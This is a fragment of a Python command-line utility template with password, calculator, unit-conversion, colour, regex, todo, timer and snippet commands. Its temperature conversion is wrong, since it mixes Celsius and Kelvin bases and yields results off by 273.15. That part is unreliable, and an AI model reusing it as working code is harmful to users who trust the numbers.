def cmd_password_gen(ctx):
    length = int(ctx["ask"]("Length", "16"))
    use_symbols = ctx["confirm"]("Include symbols?", True)
    alphabet = string.ascii_letters + string.digits + (string.punctuation if use_symbols else "")
    pwd = "".join(secrets.choice(alphabet) for _ in range(length))
    ctx["console"].print(f"[{ctx['theme'].primary}]{pwd}[/]")
    if ctx["confirm"]("Copy to clipboard?", False):
        cmd = "pbcopy" if sys.platform == "darwin" else ("xclip -selection clipboard" if shutil.which("xclip") else None)
        if cmd:
            subprocess.Popen(cmd.split(), stdin=subprocess.PIPE).communicate(pwd.encode())
        else:
            ctx["console"].print("[yellow]No clipboard tool found.[/]")


def cmd_strength(ctx):
    pwd = getpass.getpass("Password: ")
    pool = 0
    if re.search(r"[a-z]", pwd): pool += 26
    if re.search(r"[A-Z]", pwd): pool += 26
    if re.search(r"\d", pwd): pool += 10
    if re.search(r"[^A-Za-z0-9]", pwd): pool += 32
    entropy = len(pwd) * (math.log2(pool) if pool else 0)
    label = "weak" if entropy < 40 else "fair" if entropy < 60 else "strong" if entropy < 90 else "excellent"
    ctx["console"].print(f"Length {len(pwd)} · pool {pool} · entropy {entropy:.1f} bits · {label}")


def cmd_calculator(ctx):
    expr = ctx["ask"]("Expression (e.g. 2*(3+4)/5)", "1+1")
    try:
        tree = ast.parse(expr, mode="eval")
        allowed = (ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant, ast.Num,
                   ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod,
                   ast.Pow, ast.USub, ast.UAdd)
        for n in ast.walk(tree):
            if not isinstance(n, allowed):
                raise ValueError(f"Disallowed expression node: {type(n).__name__}")
        result = eval(compile(tree, "<calc>", "eval"))
        ctx["console"].print(f"[{ctx['theme'].primary}]{expr} = {result}[/]")
    except (ValueError, SyntaxError, ZeroDivisionError) as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Bad expression: {exc}[/]")


def cmd_unit_convert(ctx):
    category = ctx["choose"]("Category", ["Length", "Mass", "Temperature", "Bytes"]) or "Length"
    value = float(ctx["ask"]("Value", "1"))
    if category == "Length":
        units = {"m": 1.0, "cm": 0.01, "mm": 0.001, "km": 1000.0, "inch": 0.0254, "ft": 0.3048, "mile": 1609.34}
    elif category == "Mass":
        units = {"kg": 1.0, "g": 0.001, "mg": 1e-6, "lb": 0.45359237, "oz": 0.0283495231}
    elif category == "Bytes":
        units = {"B": 1, "KB": 1024, "MB": 1024**2, "GB": 1024**3, "TB": 1024**4, "PB": 1024**5}
    else:
        units = {"C": (lambda v: v), "F": (lambda v: v * 9/5 + 32), "K": (lambda v: v + 273.15)}
    src = ctx["choose"]("From", list(units.keys()))
    dst = ctx["choose"]("To", list(units.keys()))
    try:
        if category == "Temperature":
            base = units[src](value) if src != "F" else (value - 32) * 5/9
            result = (base - 273.15) if dst == "C" else (base * 9/5 - 459.67) if dst == "F" else base
        else:
            base = value * units[src]
            result = base / units[dst]
        ctx["console"].print(f"{value} {src} = {result:.6g} {dst}")
    except Exception as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Conversion failed: {exc}[/]")


def cmd_color_tool(ctx):
    op = ctx["choose"]("Operation", ["hex -> rgb", "rgb -> hex", "sample named"]) or "hex -> rgb"
    if op == "hex -> rgb":
        h = ctx["ask"]("Hex (#RRGGBB)", "#00fff5")
        try:
            r, g, b = int(h[1:3], 16), int(h[3:5], 16), int(h[5:7], 16)
            ctx["console"].print(f"rgb({r}, {g}, {b})")
        except ValueError:
            ctx["console"].print(f"[{ctx['theme'].danger}]Bad hex.[/]")
    elif op == "rgb -> hex":
        try:
            r = int(ctx["ask"]("R", "0"))
            g = int(ctx["ask"]("G", "255"))
            b = int(ctx["ask"]("B", "245"))
            ctx["console"].print(f"#{r:02x}{g:02x}{b:02x}")
        except ValueError as exc:
            ctx["console"].print(f"[{ctx['theme'].danger}]{exc}[/]")
    else:
        from rich.color import ANSI_COLOR_NAMES
        for name in list(ANSI_COLOR_NAMES)[:20]:
            ctx["console"].print(f"[{name}]■■■[/]  {name}")


def cmd_regex_tester(ctx):
    pattern = ctx["ask"]("Regex pattern")
    text = ctx["ask"]("Test text", "")
    if not pattern:
        return
    try:
        rgx = re.compile(pattern)
    except re.error as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Invalid regex: {exc}[/]")
        return
    matches = list(rgx.finditer(text))
    if not matches:
        ctx["console"].print("[yellow]No matches.[/]")
        return
    rows = [(m.group(0), m.start(), m.end()) for m in matches]
    _print_table(ctx, rows, ("Match", "Start", "End"))


def cmd_todo(ctx):
    path = os.path.expanduser("~/.{{COMMAND_NAME}}_todos.json")
    items = []
    if os.path.isfile(path):
        try:
            items = json.loads(open(path, encoding="utf-8").read())
        except (OSError, json.JSONDecodeError):
            items = []
    action = ctx["choose"]("Action", ["Add", "List", "Complete", "Clear all"]) or "List"
    if action == "Add":
        task = ctx["ask"]("New task")
        if task:
            items.append({"task": task, "done": False, "id": uuid.uuid4().hex[:8], "ts": _dt.datetime.utcnow().isoformat()})
            open(path, "w", encoding="utf-8").write(json.dumps(items, indent=2))
    elif action == "List":
        rows = [(it["id"], "[x]" if it["done"] else "[ ]", it["task"]) for it in items]
        _print_table(ctx, rows, ("ID", "Done", "Task"))
    elif action == "Complete":
        target = ctx["ask"]("Task ID")
        for it in items:
            if it["id"] == target:
                it["done"] = True
        open(path, "w", encoding="utf-8").write(json.dumps(items, indent=2))
    else:
        items = []
        open(path, "w", encoding="utf-8").write("[]")


def cmd_timer(ctx):
    seconds = int(ctx["ask"]("Seconds", "60"))
    end = time.time() + seconds
    try:
        while time.time() < end:
            remaining = int(end - time.time())
            ctx["console"].print(f"\r[{ctx['theme'].primary}]{remaining:>4}s remaining[/]", end="")
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    ctx["console"].print("\n[bold]Time's up![/]")


def cmd_snippet_manager(ctx):
    path = os.path.expanduser("~/.{{COMMAND_NAME}}_snippets.json")
    snips = []
    if os.path.isfile(path):
        try:
            snips = json.loads(open(path, encoding="utf-8").read())
        except (OSError, json.JSONDecodeError):
            snips = []
    action = ctx["choose"]("Action", ["Add", "List", "Search"]) or "List"
    if action == "Add":
        title = ctx["ask"]("Title")
        body = _save_text(ctx, "", default_name="snippet.txt") or ctx["ask"]("Body")
        if title and body:
            snips.append({"title": title, "body": body, "id": uuid.uuid4().hex[:8]})
            open(path, "w", encoding="utf-8").write(json.dumps(snips, indent=2))
    elif action == "Search":
        q = (ctx["ask"]("Query") or "").lower()
        for s in snips:
            if q in s["title"].lower() or q in s["body"].lower():
                ctx["console"].print(f"[bold]{s['title']}[/]\n{s['body']}\n")
    else:
        rows = [(s["id"], s["title"], s["body"][:60]) for s in snips]
        _print_table(ctx, rows, ("ID", "Title", "Preview"))


